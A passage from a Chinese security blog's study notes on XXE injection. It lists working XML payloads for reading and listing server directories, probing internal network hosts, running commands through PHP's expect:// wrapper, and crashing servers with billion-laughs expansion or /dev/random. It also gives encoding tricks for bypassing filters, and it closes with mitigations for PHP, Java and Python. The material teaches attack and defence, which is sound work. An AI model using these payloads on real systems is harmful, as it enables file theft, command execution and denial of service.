+<h4 id="列目录–JAVA"><a href="#列目录–JAVA" class="headerlink" title="列目录–JAVA"></a>列目录–JAVA</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- Root / --&gt;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE aa[&lt;!ELEMENT bb ANY&gt;&lt;!ENTITY xxe SYSTEM &quot;file:///&quot;&gt;]&gt;&lt;root&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;&lt;/root&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- /etc/ --&gt;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root[&lt;!ENTITY xxe SYSTEM &quot;file:///etc/&quot; &gt;]&gt;&lt;root&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;&lt;/root&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="内网探针"><a href="#内网探针" class="headerlink" title="内网探针"></a>内网探针</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;        </span><br><span class="line">&lt;!DOCTYPE foo [ </span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY rabbit SYSTEM &quot;http://内网ip:port&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;firstname&gt;&amp;rabbit;&lt;/firstname&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><blockquote>
+<p>该 CASE 是在安装 expect 扩展的 PHP 环境里执行系统命令</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;expect://命令&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;x&gt;&amp;xxe;&lt;/x&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="DOS攻击"><a href="#DOS攻击" class="headerlink" title="DOS攻击"></a>DOS攻击</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE lolz [  &lt;!ENTITY lol &quot;lol&quot;&gt;  &lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;  &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;  &lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;  &lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;  &lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;  &lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;  &lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;  &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt; ]&gt; &lt;lolz&gt;&amp;lol9;&lt;/lolz&gt; </span><br></pre></td></tr></table></figure>
+
+<p>此测试可以在内存中将小型 XML 文档扩展到超过 3GB 而使服务器崩溃。<br>亦或者，如果目标是UNIX系统，</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [ </span><br><span class="line">  &lt;!ELEMENT foo ANY &gt;</span><br><span class="line">  &lt;!ENTITY xxe SYSTEM &quot;file:///dev/random&quot; &gt;]&gt;</span><br><span class="line">&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br></pre></td></tr></table></figure>
+
+<p>如果 XML 解析器尝试使用<code>/dev/random</code>文件中的内容来替代实体，则此示例会使服务器（使用 UNIX 系统）崩溃。</p>
+<h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><ul>
+<li><p>phar协议反序列化</p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3741">利用EXCEL进行XXE攻击</a></p>
+</li>
+<li><p>上传svg，docx等xml格式的文件进行攻击</p>
+</li>
+<li><p>java–jar协议解压压缩包</p>
+</li>
+</ul>
+<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><ul>
+<li><p>插入空格</p>
+<p>可以在<code>&lt;?xml</code>或<code>&lt;!DOCTYPE</code>后插入任意数量的空格</p>
+<p><img src="/../images/image-20230605205020027.png" alt="image-20230605205020027"></p>
+</li>
+<li><p>编码绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UTF-7</span><br><span class="line">UTF-16(两个变体 - BE和LE)</span><br><span class="line">UTF-32(四个变体 - BE、LE、2143、3412)</span><br><span class="line">EBCDIC</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat payload.xml | iconv -f utf-8 -t utf-7 &gt; payload.7.xml</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20230606145117482.png" alt="image-20230606145117482"></p>
+</li>
+</ul>
+<h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/bmjoker/p/9614990.html">7.XXEinjector：一款功能强大的自动化XXE注射工具 - bmjoker - 博客园 (cnblogs.com)</a></p>
+<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul>
+<li>禁用外部实体</li>
+</ul>
+<p>PHP: </p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">true</span>); </span><br></pre></td></tr></table></figure>
+
+<p>JAVA: </p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">DocumentBuilderFactory</span> <span class="variable">dbf</span> <span class="operator">=</span>DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(<span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
+
+<p> Python： </p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=<span class="literal">False</span>))</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>过滤用户提交的 XML 数据</li>
+</ul>
+<p>如过滤关键词：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE 和&lt;!ENTITY，或者 SYSTEM 和 PUBLIC</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/11413335.html">https://www.cnblogs.com/20175211lyz/p/11413335.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6829#toc-4">https://xz.aliyun.com/t/6829#toc-4</a></p>
+<p>补充：<a target="_blank" rel="noopener" href="https://tttang.com/archive/1813/#toc__2">https://tttang.com/archive/1813/#toc__2</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://Fgtbnc.github.io">Khaz</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://fgtbnc.github.io/2023/06/06/XXE/">http://fgtbnc.github.io/2023/06/06/XXE/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://Fgtbnc.github.io" target="_blank">Khaz</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://fgtbnc.github.io/images/wallhaven-yxe8kk.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2023/06/01/waf%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/"><img class="next-cover" src="https://fgtbnc.github.io/images/wallhaven-j8lqmp.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">waf绕过简单学习</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s1.ax1x.com/2023/05/31/p9x0Eg1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Khaz</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">8</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/xxx" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:xxxxxx@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">记录一些自己的学习笔记</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XML"><span class="toc-number">1.</span> <span class="toc-text">XML</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80"><span class="toc-number">1.1.</span> <span class="toc-text">基础</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DTD%E4%B8%8E%E5%AE%9E%E4%BD%93"><span class="toc-number">1.2.</span> <span class="toc-text">DTD与实体</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#DTD"><span class="toc-number">1.2.1.</span> <span class="toc-text">DTD</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E4%BD%93"><span class="toc-number">1.2.2.</span> <span class="toc-text">实体</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E6%95%B0%E5%AE%9E%E4%BD%93"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">参数实体</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BC%95%E5%85%A5%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">引入外部实体</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XXE%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.</span> <span class="toc-text">XXE漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-number">2.1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="toc-number">2.2.</span> <span class="toc-text">漏洞成因</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B"><span class="toc-number">2.3.</span> <span class="toc-text">漏洞检测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8D%B1%E5%AE%B3"><span class="toc-number">2.4.</span> <span class="toc-text">漏洞危害</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">2.5.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%89%E5%9B%9E%E6%98%BE"><span class="toc-number">2.5.1.</span> <span class="toc-text">有回显</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BE"><span class="toc-number">2.5.2.</span> <span class="toc-text">无回显</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A4%96%E5%B8%A6"><span class="toc-number">2.5.2.1.</span> <span class="toc-text">外带</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E6%8A%A5%E9%94%99"><span class="toc-number">2.5.2.2.</span> <span class="toc-text">基于报错</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%BC%95%E5%85%A5%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%9E%E4%BD%93"><span class="toc-number">2.5.2.2.1.</span> <span class="toc-text">引入服务器实体</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%BC%95%E5%85%A5%E6%9C%AC%E5%9C%B0%E7%B3%BB%E7%BB%9F%E6%96%87%E4%BB%B6"><span class="toc-number">2.5.2.2.2.</span> <span class="toc-text">引入本地系统文件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B5%8C%E5%A5%97%E5%8F%82%E6%95%B0%E5%AE%9E%E4%BD%93"><span class="toc-number">2.5.2.2.3.</span> <span class="toc-text">嵌套参数实体</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">2.5.3.</span> <span class="toc-text">利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">2.5.3.1.</span> <span class="toc-text">文件读取</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%97%E7%9B%AE%E5%BD%95%E2%80%93JAVA"><span class="toc-number">2.5.3.2.</span> <span class="toc-text">列目录–JAVA</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%8E%A2%E9%92%88"><span class="toc-number">2.5.3.3.</span> <span class="toc-text">内网探针</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">2.5.3.4.</span> <span class="toc-text">命令执行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DOS%E6%94%BB%E5%87%BB"><span class="toc-number">2.5.3.5.</span> <span class="toc-text">DOS攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B6%E4%BB%96"><span class="toc-number">2.5.3.6.</span> <span class="toc-text">其他</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87"><span class="toc-number">2.5.4.</span> <span class="toc-text">绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7"><span class="toc-number">2.5.5.</span> <span class="toc-text">工具</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-number">2.6.</span> <span class="toc-text">漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">3.</span> <span class="toc-text">参考文章</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/06/06/XXE/" title="无题"><img src="https://fgtbnc.github.io/images/wallhaven-yxe8kk.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无题"/></a><div class="content"><a class="title" href="/2023/06/06/XXE/" title="无题">无题</a><time datetime="2023-06-06T06:53:08.368Z" title="发表于 2023-06-06 14:53:08">2023-06-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/06/01/waf%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/" title="waf绕过简单学习"><img src="https://fgtbnc.github.io/images/wallhaven-j8lqmp.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="waf绕过简单学习"/></a><div class="content"><a class="title" href="/2023/06/01/waf%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/" title="waf绕过简单学习">waf绕过简单学习</a><time datetime="2023-06-01T11:50:25.000Z" title="发表于 2023-06-01 19:50:25">2023-06-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/06/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B/" title="渗透测试流程"><img src="https://fgtbnc.github.io/images/wallhaven-vg3qk8.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="渗透测试流程"/></a><div class="content"><a class="title" href="/2023/06/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B/" title="渗透测试流程">渗透测试流程</a><time datetime="2023-06-01T11:48:25.000Z" title="发表于 2023-06-01 19:48:25">2023-06-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/05/31/%E9%80%9A%E8%BF%87Mysql%E5%AD%A6%E4%B9%A0sql%E6%B3%A8%E5%85%A5/" title="通过mysql学习sql注入"><img src="https://fgtbnc.github.io/images/wallhaven-yxe8kk.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="通过mysql学习sql注入"/></a><div class="content"><a class="title" href="/2023/05/31/%E9%80%9A%E8%BF%87Mysql%E5%AD%A6%E4%B9%A0sql%E6%B3%A8%E5%85%A5/" title="通过mysql学习sql注入">通过mysql学习sql注入</a><time datetime="2023-05-31T11:52:40.000Z" title="发表于 2023-05-31 19:52:40">2023-05-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/05/31/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="PHP反序列化"><img src="https://fgtbnc.github.io/images/wallhaven-yxe8kk.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="PHP反序列化"/></a><div class="content"><a class="title" href="/2023/05/31/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="PHP反序列化">PHP反序列化</a><time datetime="2023-05-31T11:48:25.000Z" title="发表于 2023-05-31 19:48:25">2023-05-31</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2022 - 2023 By Khaz</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><script src="/js/chocolate.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
